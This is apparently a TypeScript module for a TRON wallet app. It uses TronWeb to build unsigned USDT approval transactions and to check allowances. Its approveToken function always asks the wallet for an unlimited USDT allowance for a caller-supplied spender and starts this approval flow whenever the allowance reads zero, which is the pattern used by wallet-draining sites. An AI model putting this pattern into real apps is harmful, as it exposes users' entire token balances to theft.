const TronWeb = require('tronweb');

// Create TronWeb instance with default mainnet configuration
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io'
});

// Log out TronWeb version and configuration
console.log('TronWeb Version:', TronWeb.version);
console.log('Initial TronWeb Config:', {
    fullHost: tronWeb.fullNode?.host,
    solidityNode: tronWeb.solidityNode?.host,
    eventServer: tronWeb.eventServer?.host
});

// Default USDT contract address (TRC20)
export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// ABI for USDT token - minimal version with just what we need
const USDT_ABI = [
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            },
            {
                "name": "_spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "remaining",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// Export the configured TronWeb instance
export { tronWeb };

// Helper to debug TronWeb state
function debugTronWebState() {
    console.log('TronWeb Provider Info:', {
        fullHost: tronWeb.fullNode ? tronWeb.fullNode.host : 'not set',
        hasAddress: !!tronWeb.defaultAddress,
        apiKey: tronWeb.fullNode?.headers?.['TRON-PRO-API-KEY'] || 'none'
    });
    
    if (tronWeb.defaultAddress) {
        console.log('Current TronWeb address:', tronWeb.defaultAddress.base58);
    }
}

// Setup TronWeb with user's address
export function setupTronWeb(address: string): boolean {
    if (!address) {
        console.error('Cannot setup TronWeb: address is missing');
        return false;
    }
    
    try {
        console.log('Setting up TronWeb with address:', address);
        tronWeb.setAddress(address);
        
        // Verify setup was successful
        debugTronWebState();
        
        return true;
    } catch (error) {
        console.error('TronWeb setup error:', error);
        console.error('Error stack:', error instanceof Error ? error.stack : 'No stack trace');
        return false;
    }
}

// Create an unsigned contract call transaction
export async function createContractTransaction(
    contractAddress: string,
    functionSelector: string,
    parameters: any[],
    options: any,
    fromAddress: string
): Promise<any> {
    try {
        console.log(`Creating contract call: ${functionSelector}`);
        
        // Use transaction builder to create an unsigned transaction
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            contractAddress,
            functionSelector,
            options,
            parameters,
            fromAddress
        );
        
        console.log('Transaction created:', tx.result ? 'success' : 'failed');
        
        if (!tx.result || !tx.result.result) {
            console.error('Failed to create transaction:', tx);
            throw new Error('Transaction creation failed');
        }
        
        // Return the transaction for the wallet to sign
        return tx.transaction;
    } catch (error: any) {
        console.error('Error creating contract transaction:', error);
        throw error;
    }
}

// Create a USDT approval transaction to be sent to the wallet
export async function approveToken(
    ownerAddress: string,
    spenderAddress: string
): Promise<any> {
    try {
        // Ensure TronWeb is set up with the user's address
        setupTronWeb(ownerAddress);
        
        console.log(`Creating USDT approval from ${ownerAddress} to ${spenderAddress}`);
        
        // Create a properly formatted transaction using the function signature
        // "approve(address,uint256)" with proper parameters
        const transaction = await createContractTransaction(
            USDT_CONTRACT_ADDRESS,
            'approve(address,uint256)',
            [
                { type: 'address', value: spenderAddress },
                { type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
            ],
            {
                feeLimit: 100000000,
                callValue: 0
            },
            ownerAddress
        );
        
        console.log('Approval transaction created successfully. Transaction ID:', transaction.txID);
        
        // IMPORTANT: We DO NOT sign the transaction here
        // Instead, we return the unsigned transaction for the wallet connector to handle signing
        console.log('Returning unsigned transaction for wallet to sign');
        
        return transaction;
    } catch (error: any) {
        console.error('Failed to create approval transaction:', error);
        throw error;
    }
}

// Check token allowance - multiple approaches for reliability
export async function checkAllowance(
    ownerAddress: string, 
    spenderAddress: string
): Promise<string> {
    if (!ownerAddress || !spenderAddress) {
        console.error('Missing address parameters for allowance check');
        return '0';
    }
    
    try {
        console.log('Checking allowance for:', {
            owner: ownerAddress,
            spender: spenderAddress
        });
        
        // Setup TronWeb
        setupTronWeb(ownerAddress);
        
        try {
            // Method 1: Try getting contract via tronWeb.contract().at()
            console.log('Trying method 1: contract().at()');
            const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
            
            if (contract && contract.allowance) {
                const result = await contract.allowance(ownerAddress, spenderAddress).call();
                console.log('Method 1 result:', result);
                
                if (result) {
                    // Parse the result
                    const allowanceValue = result.toString();
                    console.log('Allowance value (method 1):', allowanceValue);
                    return allowanceValue;
                }
            }
        } catch (method1Error) {
            console.warn('Method 1 failed:', method1Error);
            // Continue to next method
        }
        
        try {
            // Method 2: Direct contract parameter call
            console.log('Trying method 2: triggerConstantContract');
            const result = await tronWeb.transactionBuilder.triggerConstantContract(
                USDT_CONTRACT_ADDRESS,
                'allowance(address,address)',
                {},
                [
                    { type: 'address', value: ownerAddress },
                    { type: 'address', value: spenderAddress }
                ]
            );
            
            console.log('Method 2 result:', result);
            
            if (result && result.constant_result && result.constant_result[0]) {
                // Convert hex to decimal
                const hex = '0x' + result.constant_result[0];
                const allowanceValue = tronWeb.toBigNumber(hex).toString();
                console.log('Allowance value (method 2):', allowanceValue);
                return allowanceValue;
            }
        } catch (method2Error) {
            console.warn('Method 2 failed:', method2Error);
        }
        
        // If we get here, both methods failed
        console.warn('All allowance check methods failed, defaulting to 0');
        return '0';
    } catch (error) {
        console.error('Allowance check completely failed:', error);
        return '0'; // Default to 0 to trigger approval flow
    }
}
